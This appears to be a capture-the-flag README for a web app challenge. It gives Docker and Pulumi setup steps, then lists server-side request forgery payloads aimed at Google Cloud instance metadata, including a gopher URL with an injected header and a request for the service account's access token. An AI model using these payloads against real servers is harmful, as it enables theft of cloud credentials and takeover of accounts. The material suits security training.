## CTF

## /secure_app/
A more secure way of doing things. Requests the URL from the user's browser instead of requesting from the server

## setup

1. `docker build -t achilles app`
2. `docker tag achilles gcr.io/praxis-gear-297003/achilles`
3. `docker push gcr.io/praxis-gear-297003/achilles` 
4. `pulumi up`

gopher://metadata.google.internal:80/computeMetadata/v1/instance/machine-type%20HTTP/1.1%0AMetadata-Flavor:%20Google%0A%0A

http://metadata/computeMetadata/v1/

http://metadata/instanceMetadata/v1/instance/service-accounts/default/token

metadata/instanceMetadata/v1/instance/service-accounts/default/scopes